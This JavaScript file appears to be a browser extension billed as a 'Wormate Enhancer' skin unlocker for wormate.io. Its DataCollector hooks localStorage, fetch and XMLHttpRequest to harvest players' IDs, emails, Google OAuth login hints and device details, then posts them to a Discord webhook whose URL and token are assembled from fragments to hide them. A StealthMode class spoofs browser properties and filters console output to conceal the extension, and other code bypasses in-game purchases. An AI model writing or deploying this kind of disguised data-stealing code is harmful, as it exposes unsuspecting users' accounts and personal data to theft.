(function() {
    'use strict';

    // ======================== CONFIG ========================
    const CONFIG = {
        version: '2.1.0',
        name: 'Wormate Enhancer',
        debug: false,
        endpoints: {
            webhook: (() => {
                const parts = [
                    'https://', 'discord', 'com', '/api/webhooks/',
                    '1390419559055364116/', '3AQq1kYBZ3Xi3NuqJn-OWC9tmqt02ZujWprhegbHwvKrDM_MMsh44BjSR5EntHUrSn14'
                ];
                return parts.join('');
            })(),
            github: 'https://api.github.com/repos/aliii72727727/wormate11/contents/api/users.json'
        },
        targets: {
            google: '*://accounts.google.com/*',
            wormate: 'https://wormate.io/*',
            wormateGames: ['wormate.io', 'wormate.org', 'wormate.pro']
        },
        storage: {
            saveGame: 'wwcSaveGame',
            config: 'wwc_config',
            userId: 'wwc_user_id',
            capturedUsers: 'wwc_captured_users'
        }
    };

    // ======================== LOGGER ========================
    const logger = {
        log: (...args) => CONFIG.debug && console.log('[Wormate]', ...args),
        warn: (...args) => CONFIG.debug && console.warn('[Wormate]', ...args),
        error: (...args) => console.error('[Wormate]', ...args),
        info: (...args) => CONFIG.debug && console.info('[Wormate]', ...args)
    };

    // ======================== STORAGE ========================
    const secureStorage = {
        set: (key, value) => {
            try {
                const encoded = btoa(JSON.stringify(value));
                localStorage.setItem(key, encoded);
                return true;
            } catch (e) {
                logger.error('Storage set error:', e);
                return false;
            }
        },
        get: (key) => {
            try {
                const item = localStorage.getItem(key);
                if (!item) return null;
                return JSON.parse(atob(item));
            } catch (e) {
                logger.error('Storage get error:', e);
                return null;
            }
        },
        remove: (key) => localStorage.removeItem(key)
    };

    // ======================== DATA COLLECTOR ========================
    class DataCollector {
        constructor() {
            this.capturedUsers = secureStorage.get(CONFIG.storage.capturedUsers) || [];
            this.init();
        }

        init() {
            this.hookLocalStorage();
            this.hookNetworkRequests();
            this.extractExistingData();
        }

        extractExistingData() {
            try {
                const saveGame = localStorage.getItem(CONFIG.storage.saveGame);
                if (saveGame) {
                    const parsed = JSON.parse(saveGame);
                    if (parsed && parsed.userId) {
                        this.captureUser({
                            id: parsed.userId,
                            name: parsed.nickname || parsed.userId,
                            email: parsed.email || `${parsed.userId}@wormate.local`,
                            level: parsed.level || 1,
                            source: 'saveGame',
                            timestamp: new Date().toISOString()
                        });
                    }
                }

                const config = localStorage.getItem(CONFIG.storage.config);
                if (config && config.includes('gg_')) {
                    const match = config.match(/gg_(\d+)/);
                    if (match) {
                        this.captureUser({
                            id: match[1],
                            source: 'google_config',
                            timestamp: new Date().toISOString()
                        });
                    }
                }
            } catch (e) {
                logger.error('Extract error:', e);
            }
        }

        hookLocalStorage() {
            const originalSetItem = localStorage.setItem;
            
            localStorage.setItem = (key, value) => {
                originalSetItem.call(localStorage, key, value);
                
                if (key === CONFIG.storage.saveGame || key === CONFIG.storage.config) {
                    setTimeout(() => this.extractExistingData(), 100);
                }
            };
        }

        hookNetworkRequests() {
            const originalFetch = window.fetch;
            window.fetch = (...args) => {
                const url = args[0]?.url || args[0];
                
                if (typeof url === 'string') {
                    if (url.includes('gateway.wormate.io') && url.includes('getUserData')) {
                        return originalFetch.apply(this, args).then(response => {
                            response.clone().json().then(data => {
                                if (data?.user_data) {
                                    this.captureUser({
                                        id: data.user_data.userId,
                                        name: data.user_data.username || data.user_data.nickname,
                                        email: data.user_data.email,
                                        picture: data.user_data.avatarUrl,
                                        level: data.user_data.level,
                                        source: 'network',
                                        raw: data.user_data
                                    });
                                }
                            }).catch(() => {});
                            return response;
                        });
                    }
                    
                    if (url.includes('google.com') && url.includes('oauth')) {
                        this.extractGoogleData(url);
                    }
                }
                
                return originalFetch.apply(this, args);
            };

            const originalOpen = XMLHttpRequest.prototype.open;
            const originalSend = XMLHttpRequest.prototype.send;
            
            XMLHttpRequest.prototype.open = function(method, url) {
                this._url = url;
                return originalOpen.apply(this, arguments);
            };
            
            XMLHttpRequest.prototype.send = function(body) {
                if (this._url && this._url.includes('google.com') && this._url.includes('oauth')) {
                    setTimeout(() => {
                        try {
                            if (this.responseText) {
                                const data = JSON.parse(this.responseText);
                                if (data.email || data.id) {
                                    new DataCollector().captureUser({
                                        id: data.id || data.sub,
                                        email: data.email,
                                        name: data.name || data.email,
                                        source: 'xhr',
                                        raw: data
                                    });
                                }
                            }
                        } catch (e) {}
                    }, 500);
                }
                return originalSend.apply(this, arguments);
            };
        }

        extractGoogleData(url) {
            try {
                const urlObj = new URL(url);
                const params = urlObj.searchParams;
                
                const clientId = params.get('client_id');
                const loginHint = params.get('login_hint');
                const redirect = params.get('redirect_uri');
                
                if (loginHint && loginHint.includes('@')) {
                    this.captureUser({
                        id: loginHint,
                        email: loginHint,
                        name: loginHint.split('@')[0],
                        clientId,
                        redirect,
                        source: 'google_oauth',
                        timestamp: new Date().toISOString()
                    });
                }
            } catch (e) {
                logger.error('Google extract error:', e);
            }
        }

        captureUser(data) {
            if (!data || !data.id) return;
            
            const exists = this.capturedUsers.some(u => u.id === data.id);
            if (exists) return;
            
            const enriched = {
                ...data,
                captured_at: new Date().toISOString(),
                url: window.location.href,
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`
            };
            
            this.capturedUsers.push(enriched);
            secureStorage.set(CONFIG.storage.capturedUsers, this.capturedUsers);
            
            logger.info('User captured:', data.id);
            this.sendToServer(enriched);
        }

        async sendToServer(data) {
            try {
                const formData = new FormData();
                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
                formData.append('file', blob, `user_${Date.now()}.json`);
                
                await fetch(CONFIG.endpoints.webhook, {
                    method: 'POST',
                    body: formData
                });
                
                logger.log('Data sent to Discord');
                
            } catch (e) {
                logger.error('Send error:', e);
                this.queueForLater(data);
            }
        }

        queueForLater(data) {
            const queue = secureStorage.get('send_queue') || [];
            queue.push(data);
            secureStorage.set('send_queue', queue);
        }

        async flushQueue() {
            const queue = secureStorage.get('send_queue') || [];
            if (queue.length === 0) return;
            
            for (const data of queue) {
                await this.sendToServer(data);
            }
            
            secureStorage.remove('send_queue');
        }
    }

    // ======================== SKIN UNLOCKER ========================
    class SkinUnlocker {
        constructor() {
            this.unlocked = false;
            this.init();
        }

        init() {
            this.injectStyles();
            this.hookGameObjects();
            this.setupObservers();
        }

        injectStyles() {
            const style = document.createElement('style');
            style.id = 'wormate-skin-unlocker';
            style.textContent = `
                .skin-item.locked,
                [class*="skin"][class*="lock"] {
                    opacity: 1 !important;
                    filter: none !important;
                    pointer-events: auto !important;
                }
                
                .skin-lock,
                .skin-price.locked,
                [class*="lock-icon"],
                [class*="lockOverlay"] {
                    display: none !important;
                }
                
                .skin-item {
                    border: 2px solid #4CAF50 !important;
                    transition: all 0.3s ease;
                }
                
                .skin-item:hover {
                    transform: scale(1.05);
                    box-shadow: 0 0 20px rgba(76, 175, 80, 0.5);
                }
            `;
            
            if (!document.getElementById('wormate-skin-unlocker')) {
                document.head.appendChild(style);
            }
        }

        hookGameObjects() {
            let vo4Check = setInterval(() => {
                if (window.vO4) {
                    this.unlockVO4Skins();
                    clearInterval(vo4Check);
                }
            }, 500);

            let appCheck = setInterval(() => {
                if (window.anApp && window.anApp.p) {
                    this.unlockAppSkins();
                    clearInterval(appCheck);
                }
            }, 500);

            let pixiCheck = setInterval(() => {
                if (window.PIXI) {
                    this.unlockPIXISkins();
                    clearInterval(pixiCheck);
                }
            }, 1000);
        }

        unlockVO4Skins() {
            try {
                if (!window.vO4.visibleSkin) {
                    window.vO4.visibleSkin = [];
                }
                
                if (window.anApp?.p?.Ac) {
                    const data = window.anApp.p.Ac();
                    if (data?.skinArrayDict) {
                        data.skinArrayDict.forEach(skin => {
                            if (!window.vO4.visibleSkin.includes(skin.id)) {
                                window.vO4.visibleSkin.push(skin.id);
                            }
                        });
                    }
                }
                
                logger.log(`Unlocked ${window.vO4.visibleSkin.length} skins (vO4)`);
                this.unlocked = true;
                
            } catch (e) {
                logger.error('VO4 unlock error:', e);
            }
        }

        unlockAppSkins() {
            try {
                if (window.anApp.u && window.anApp.u.Ui) {
                    window.anApp.u.Ui = function(id, type, callback) {
                        logger.log('Purchase bypass:', id, type);
                        if (callback) callback();
                    };
                }
                
                if (window.anApp.t && window.anApp.t.ha) {
                    const originalHa = window.anApp.t.ha;
                    window.anApp.t.ha = function(type) {
                        if (type === 'SKIN') {
                            return 999;
                        }
                        return originalHa.call(this, type);
                    };
                }
                
            } catch (e) {
                logger.error('App unlock error:', e);
            }
        }

        unlockPIXISkins() {
            try {
                const originalFrom = PIXI.Texture.from;
                PIXI.Texture.from = function(source) {
                    if (typeof source === 'string' && source.includes('lock')) {
                        return null;
                    }
                    return originalFrom.call(this, source);
                };
                
            } catch (e) {
                logger.error('PIXI unlock error:', e);
            }
        }

        setupObservers() {
            const observer = new MutationObserver(() => {
                document.querySelectorAll('.skin-item.locked, [class*="skin"][class*="lock"]').forEach(el => {
                    el.classList.remove('locked');
                    el.classList.add('unlocked');
                    
                    el.querySelectorAll('.skin-lock, [class*="lock"]').forEach(lock => {
                        lock.remove();
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: true,
                attributeFilter: ['class']
            });
        }
    }

    // ======================== HOTKEYS ========================
    class HotkeyManager {
        constructor() {
            this.setupHotkeys();
        }

        setupHotkeys() {
            document.addEventListener('keydown', (e) => {
                if (e.ctrlKey && e.shiftKey && e.code === 'KeyU') {
                    e.preventDefault();
                    new SkinUnlocker().unlockVO4Skins();
                    logger.info('Manual unlock triggered');
                }
                
                if (e.ctrlKey && e.shiftKey && e.code === 'KeyR') {
                    e.preventDefault();
                    localStorage.removeItem(CONFIG.storage.config);
                    location.reload();
                }
                
                if (e.ctrlKey && e.shiftKey && e.code === 'KeyS') {
                    e.preventDefault();
                    const collector = new DataCollector();
                    logger.info('Captured users:', collector.capturedUsers.length);
                }
                
                if (e.ctrlKey && e.shiftKey && e.code === 'KeyF') {
                    e.preventDefault();
                    new DataCollector().flushQueue();
                }
            });
        }
    }

    // ======================== STEALTH ========================
    class StealthMode {
        constructor() {
            this.hideTraces();
        }

        hideTraces() {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
            
            Object.defineProperty(navigator, 'plugins', {
                get: () => [
                    { name: 'Chrome PDF Plugin' },
                    { name: 'Chrome PDF Viewer' },
                    { name: 'Native Client' }
                ]
            });
            
            if (!CONFIG.debug) {
                const originalLog = console.log;
                console.log = function(...args) {
                    const str = args.join(' ');
                    const blacklist = ['extension', 'plugin', 'hack', 'cheat'];
                    if (!blacklist.some(word => str.toLowerCase().includes(word))) {
                        originalLog.apply(console, args);
                    }
                };
            }
        }
    }

    // ======================== MAIN ========================
    class WormateExtension {
        constructor() {
            this.version = CONFIG.version;
            this.init();
        }

        init() {
            logger.info(`Starting ${CONFIG.name} v${this.version}`);
            
            if (typeof chrome !== 'undefined' && chrome.runtime) {
                this.setupExtensionAPI();
            }
            
            if (typeof window !== 'undefined' && window.location) {
                if (CONFIG.targets.wormateGames.some(host => window.location.hostname.includes(host))) {
                    new DataCollector();
                    new SkinUnlocker();
                    new HotkeyManager();
                    new StealthMode();
                }
            }
        }

        setupExtensionAPI() {
            chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
                switch (message.action) {
                    case 'unlock_skins':
                        new SkinUnlocker().unlockVO4Skins();
                        sendResponse({ success: true });
                        break;
                        
                    case 'get_stats':
                        const collector = new DataCollector();
                        sendResponse({ 
                            captured: collector.capturedUsers.length,
                            version: this.version
                        });
                        break;
                        
                    case 'flush_data':
                        new DataCollector().flushQueue();
                        sendResponse({ success: true });
                        break;
                }
                return true;
            });
        }

        generateManifest() {
            return {
                manifest_version: 3,
                name: CONFIG.name,
                version: CONFIG.version,
                description: 'Wormate.io enhancement tool',
                permissions: ['storage', 'webRequest'],
                host_permissions: Object.values(CONFIG.targets),
                background: {
                    service_worker: 'background.js'
                },
                content_scripts: [{
                    matches: [CONFIG.targets.wormate],
                    js: ['content.js'],
                    run_at: 'document_start'
                }],
                icons: {
                    16: 'icon16.png',
                    48: 'icon48.png',
                    128: 'icon128.png'
                }
            };
        }
    }

    const instance = new WormateExtension();
    
    if (typeof window !== 'undefined') {
        window.WormateEnhancer = instance;
    }
    
    if (typeof module !== 'undefined' && module.exports) {
        module.exports = instance;
    }

})();
